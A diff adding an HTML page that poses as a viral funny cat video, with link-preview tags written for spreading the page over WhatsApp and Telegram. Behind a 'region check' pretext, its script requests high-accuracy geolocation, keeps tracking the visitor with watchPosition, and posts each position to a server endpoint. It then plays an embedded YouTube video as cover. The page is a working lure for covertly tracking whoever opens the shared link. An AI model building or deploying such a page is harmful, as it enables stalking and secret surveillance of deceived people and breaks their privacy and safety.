@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Viral Funny Video - Watch Now</title>
+
+    <!-- OG tags for WhatsApp/Telegram preview -->
+    <meta property="og:title" content="Viral Funny Cat Video 2026 – Must See!" />
+    <meta property="og:description" content="This is going crazy right now 😂 Click to watch full HD." />
+    <meta property="og:image" content="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80" />
+    <meta property="og:type" content="video.other" />
+
+    <style>
+        body { font-family: Arial, sans-serif; background: #111; color: white; margin: 0; padding: 20px; text-align: center; }
+        .container { max-width: 600px; margin: auto; background: #222; padding: 20px; border-radius: 12px; }
+        h1 { color: #ffcc00; }
+        .btn { background: #e50914; color: white; border: none; padding: 16px 32px; font-size: 20px; border-radius: 8px; cursor: pointer; margin: 20px 0; }
+        #status { font-size: 18px; margin: 20px 0; color: #ffcc00; }
+        #video-area { margin-top: 30px; min-height: 300px; background: black; display: flex; align-items: center; justify-content: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Viral Funny Video</h1>
+        <p id="status">Tap below to start watching this hilarious clip! (Region check required)</p>
+        <button class="btn" id="startBtn">Play Video</button>
+        <div id="video-area">Video loads after verification...</div>
+    </div>
+
+    <script>
+        const status = document.getElementById('status');
+        const videoArea = document.getElementById('video-area');
+        const startBtn = document.getElementById('startBtn');
+
+        async function sendLocation(position) {
+            const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                const res = await fetch('/api/send_location/', {  // trailing slash for safety
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                if (res.ok) {
+                    console.log('Location sent:', data);
+                    status.textContent = 'Thanks! Location verified. Enjoy the video!';
+                } else {
+                    console.error('Server responded with error:', res.status);
+                    status.textContent = 'Error sending location (server issue). Try again.';
+                }
+            } catch (err) {
+                console.error('Send failed:', err);
+                status.textContent = 'Failed to send location. Check connection.';
+            }
+        }
+
+        function handleError(err) {
+            console.error('Geolocation error:', err.message);
+            status.textContent = 'Location access denied or failed.';
+        }
+
+        function startTracking() {
+            if (!navigator.geolocation) {
+                status.textContent = 'Geolocation not supported in this browser.';
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+
+            navigator.geolocation.watchPosition(sendLocation, handleError, {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+            });
+        }
+
+        startBtn.addEventListener('click', () => {
+            startTracking();
+            startBtn.disabled = true;
+            startBtn.style.opacity = '0.6';
+
+            // Embed real funny video (Rickroll for demo – change ID if you want)
+            videoArea.innerHTML = `<iframe width="100%" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0" frameborder="0" allowfullscreen></iframe>`;
+        });
+    </script>
+</body>
+</html>
